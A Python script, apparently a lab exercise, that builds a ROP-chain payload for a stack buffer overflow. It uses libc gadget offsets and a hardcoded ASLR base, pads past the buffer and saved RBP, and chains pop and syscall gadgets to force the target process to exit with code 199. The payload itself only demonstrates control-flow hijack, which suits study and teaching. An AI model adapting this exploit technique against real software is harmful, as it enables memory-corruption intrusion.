import os

# Change the current working directory to the script's directory.
abspath = os.path.abspath(__file__)
dname = os.path.dirname(abspath)
os.chdir(dname)


# Change this for the current ASLR execution of the vulnerable process.
baseAddressLibC = 0x000072ecdba28000


# xor rax, rax; ret
addressXorRax = baseAddressLibC + 0x182db0

# xchg rdi, rax; cld; ret
addressXchgRaxRdi = baseAddressLibC + 0x176321

# inc rdi; add rax, rdi; vzeroupper; ret
addressIncRdi = baseAddressLibC + 0x168524

# pop rdi; ret
addressPopRdi = baseAddressLibC + 0x0ed78c

# pop rax; ret
addressPopRax = baseAddressLibC + 0x0b5237

# syscall; ret
addressSyscall = baseAddressLibC + 0x1121bb


payload = b''

# Add padding to get over the stack buffer.
payload += (100) * b'\xFF'
# Add padding to get over ??.
payload += (12) * b'\xFF'
# Add padding to get over the stored RBP value.
payload += (8) * b'\xFF'


if False:
    # RAX = 0;
    payload += addressXorRax.to_bytes(8, 'little')

    # swap(RAX, RID) -> RDI = 0;
    payload += addressXchgRaxRdi.to_bytes(8, 'little')

    for _ in range(255):
        # RDI++;
        payload += addressIncRdi.to_bytes(8, 'little')

if True:
    # RDI = returnCode;
    returnCode = 199
    payload += addressPopRdi.to_bytes(8, 'little')
    payload += returnCode.to_bytes(8, 'little')

# RAX = 60; (system call number for `exit();`)
payload += addressPopRax.to_bytes(8, 'little')
payload += (60).to_bytes(8, 'little')

# exit(RDI);
payload += addressSyscall.to_bytes(8, 'little')

# Add more padding to fit the hardcoded length in the user code.
payload += b'\xFF' * 100

print(f"payload = {payload}")
with open('syscallExitPayload.dat', 'wb') as fout:
    fout.write(payload)


